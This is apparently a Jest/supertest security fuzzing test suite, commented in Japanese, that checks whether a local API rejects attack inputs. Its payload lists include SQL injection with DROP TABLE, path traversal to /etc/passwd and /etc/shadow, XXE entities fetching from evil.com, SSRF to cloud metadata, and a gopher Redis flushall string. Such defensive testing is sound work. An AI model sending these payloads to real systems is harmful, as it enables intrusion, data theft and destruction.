const request = require('supertest');
const { app } = require('../../src/server');
const {
  generateRandomString,
  generateRandomHeaders
} = require('../utils/fuzzingHelpers');

describe('Security Fuzzing Tests', () => {
  describe('認証・認可バイパステスト', () => {
    test('偽造されたAuthorizationヘッダーでのテスト', async () => {
      const fakeAuthHeaders = [
        'Bearer fake_token_12345',
        'Bearer ' + generateRandomString({ maxLength: 100 }),
        'Basic ' + Buffer.from('admin:admin').toString('base64'),
        'Basic ' + Buffer.from('root:password').toString('base64'),
        'Basic ' + generateRandomString({ maxLength: 100 }),
        'Digest username="admin"',
        'JWT ' + generateRandomString({ maxLength: 200 }),
        'API-KEY ' + generateRandomString({ maxLength: 50 }),
        'Token ' + generateRandomString({ maxLength: 100 }),
        '',
        null,
        undefined
      ];

      for (const authHeader of fakeAuthHeaders) {
        const headers = authHeader ? { 'Authorization': authHeader } : {};
        
        const response = await request(app)
          .get('/api/users')
          .set(headers);

        // 認証が必要ないエンドポイントなので200を期待
        // 実際のアプリでは認証エラーを適切に処理する
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('HTTPヘッダーインジェクションテスト', () => {
    test('悪意のあるヘッダーでのテスト', async () => {
      const maliciousHeaders = [
        { 'X-Forwarded-For': '127.0.0.1; DROP TABLE users; --' },
        { 'User-Agent': '<script>alert("XSS")</script>' },
        { 'Referer': 'javascript:alert("XSS")' },
        { 'Origin': 'null' },
        { 'Content-Type': 'application/json; charset=utf-7' },
        { 'Content-Length': '-1' },
        { 'Content-Length': '999999999' },
        { 'Transfer-Encoding': 'chunked' },
        { 'X-Real-IP': '../../../etc/passwd' },
        { 'X-Forwarded-Proto': 'javascript:alert(1)' },
        { 'Host': 'evil.com' },
        { 'Cookie': generateRandomString({ includeSQL: true, maxLength: 1000 }) }
      ];

      for (const maliciousHeader of maliciousHeaders) {
        const response = await request(app)
          .get('/api/users')
          .set(maliciousHeader);

        // 悪意のあるヘッダーでもサーバーエラーを起こさない
        expect(response.status).toBeLessThan(500);
      }
    });

    test('HTTPヘッダーサイズ制限テスト', async () => {
      const largeSizes = [1024, 8192, 65536]; // 1KB, 8KB, 64KB

      for (const size of largeSizes) {
        const largeHeaderValue = 'A'.repeat(size);
        
        try {
          const response = await request(app)
            .get('/api/users')
            .set('X-Large-Header', largeHeaderValue);

          // 大きなヘッダーが適切に処理される
          expect(response.status).toBeLessThan(500);
        } catch (error) {
          // ヘッダーサイズ制限でエラーが発生することは期待される
          expect(error.message).toMatch(/header|size|limit/i);
        }
      }
    });
  });

  describe('パストラバーサル攻撃テスト', () => {
    test('ファイルパストラバーサル試行', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '/etc/shadow',
        '/proc/self/environ',
        '/proc/version',
        'C:\\boot.ini',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        // ユーザーIDとしてパストラバーサル試行
        const response = await request(app)
          .get(`/api/users/${encodeURIComponent(payload)}`);

        // パストラバーサルは適切に拒否される
        expect(response.status).toBe(400);
      }
    });

    test('ファイルアップロードでのパストラバーサル', async () => {
      const pathTraversalFilenames = [
        '../../../malicious.txt',
        '..\\..\\..\\malicious.txt',
        '/etc/passwd',
        'C:\\windows\\system32\\malicious.txt',
        '....//....//malicious.txt',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fmalicious.txt'
      ];

      for (const filename of pathTraversalFilenames) {
        const response = await request(app)
          .post('/api/upload')
          .send({
            filename: filename,
            content: 'malicious content'
          });

        // 危険なファイル名は拒否される
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid filename');
      }
    });
  });

  describe('SQLインジェクション詳細テスト', () => {
    test('高度なSQLインジェクション試行', async () => {
      const advancedSQLPayloads = [
        // Union-based injection
        "' UNION SELECT username, password FROM admin_users --",
        "' UNION ALL SELECT NULL, table_name FROM information_schema.tables --",
        
        // Boolean-based blind injection
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) > 64 --",
        
        // Time-based blind injection
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND (SELECT SLEEP(5)) --",
        "'; SELECT pg_sleep(5) --",
        
        // Error-based injection
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        
        // Second-order injection
        "admin'; DROP TABLE logs; --",
        
        // NoSQL injection (MongoDB style)
        "'; return {username: 1, password: 1}; //",
        "'; this.username == 'admin' && this.password //",
        
        // JSON injection
        '{"$where": "function() { return (this.username == \'admin\') }"}',
        
        // LDAP injection
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        
        // XML injection
        "'; SELECT XMLELEMENT(name \"script\", XMLATTRIBUTES('javascript:alert(1)' as \"src\")); --"
      ];

      for (const payload of advancedSQLPayloads) {
        const response = await request(app)
          .get('/api/search')
          .query({ query: payload });

        // SQLインジェクションは検出・拒否される
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('dangerous');
      }
    });
  });

  describe('NoSQLインジェクションテスト', () => {
    test('MongoDBスタイルのインジェクション試行', async () => {
      const noSQLPayloads = [
        { username: { $gt: "" }, password: { $gt: "" } },
        { username: { $ne: null }, password: { $ne: null } },
        { username: { $regex: ".*" }, password: { $regex: ".*" } },
        { $where: "function() { return true; }" },
        { $or: [{ username: "admin" }, { username: "root" }] },
        { username: { $in: ["admin", "root", "user"] } },
        { password: { $exists: true } },
        { $text: { $search: "admin" } }
      ];

      for (const payload of noSQLPayloads) {
        const response = await request(app)
          .post('/api/users')
          .send(payload);

        // NoSQLインジェクションは適切に処理される
        expect(response.status).toBeLessThan(500);
        // 通常は400（バリデーションエラー）を期待
        if (response.status >= 400) {
          expect(response.body).toHaveProperty('error');
        }
      }
    });
  });

  describe('XXE (XML External Entity) 攻撃テスト', () => {
    test('XMLペイロードでのXXE試行', async () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///c:/boot.ini\'>]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd"> %dtd;]><test></test>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/"> %xxe;]><stockCheck><productId>1</productId></stockCheck>'
      ];

      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/users')
          .set('Content-Type', 'application/xml')
          .send(payload);

        // XMLは処理されない（JSONのみサポート）
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('CSRF (Cross-Site Request Forgery) テスト', () => {
    test('CSRFトークンなしでの状態変更操作', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://attacker.site',
        'http://localhost:8080',
        'null',
        'file://',
        'data:text/html,<script>alert(1)</script>'
      ];

      for (const origin of maliciousOrigins) {
        const response = await request(app)
          .post('/api/users')
          .set('Origin', origin)
          .set('Referer', origin)
          .send({
            name: 'CSRF Test User',
            email: 'csrf@evil.com',
            age: 25
          });

        // CORSが適切に設定されている場合、特定のオリジンは拒否される
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('HTTPメソッドオーバーライドテスト', () => {
    test('HTTPメソッドオーバーライド試行', async () => {
      const overrideMethods = ['PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
      
      for (const method of overrideMethods) {
        const response = await request(app)
          .post('/api/users')
          .set('X-HTTP-Method-Override', method)
          .send({
            name: 'Method Override Test',
            email: 'test@example.com'
          });

        // メソッドオーバーライドは処理されない
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('Session/Cookie攻撃テスト', () => {
    test('セッション固定化攻撃', async () => {
      const maliciousCookies = [
        'sessionid=admin_session_12345',
        'PHPSESSID=attacker_controlled_session',
        'auth_token=fake_token_for_admin',
        'user_id=1; admin=true',
        'sessionid=../../../etc/passwd',
        'auth=' + generateRandomString({ includeSQL: true, maxLength: 100 })
      ];

      for (const cookie of maliciousCookies) {
        const response = await request(app)
          .get('/api/users')
          .set('Cookie', cookie);

        // 偽造されたセッションは無効として処理される
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('HTTP Response Splitting テスト', () => {
    test('レスポンス分割攻撃試行', async () => {
      const responseSplittingPayloads = [
        'test\r\nSet-Cookie: admin=true',
        'user\r\n\r\n<script>alert("XSS")</script>',
        'normal%0d%0aSet-Cookie:%20admin=true',
        'test\nLocation: http://evil.com',
        'value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>'
      ];

      for (const payload of responseSplittingPayloads) {
        const response = await request(app)
          .get('/api/search')
          .query({ query: payload });

        // レスポンス分割攻撃は防がれる
        expect(response.status).toBeLessThan(500);
        
        // レスポンスヘッダーが汚染されていない
        expect(response.headers['set-cookie']).toBeUndefined();
        expect(response.headers['location']).not.toContain('evil.com');
      }
    });
  });

  describe('Server-Side Request Forgery (SSRF) テスト', () => {
    test('SSRF攻撃試行', async () => {
      const ssrfPayloads = [
        'http://127.0.0.1:22',
        'http://localhost:3306',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://internal.server.com',
        'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
        'http://[::1]:22',
        'http://0x7f000001:22'
      ];

      for (const payload of ssrfPayloads) {
        // URLを含むリクエストでSSRF試行
        const response = await request(app)
          .post('/api/users')
          .send({
            name: 'SSRF Test',
            email: 'test@example.com',
            website: payload, // 存在しないフィールドだがSSRF試行
            age: 25
          });

        // SSRFは実行されない
        expect(response.status).toBeLessThan(500);
      }
    });
  });
});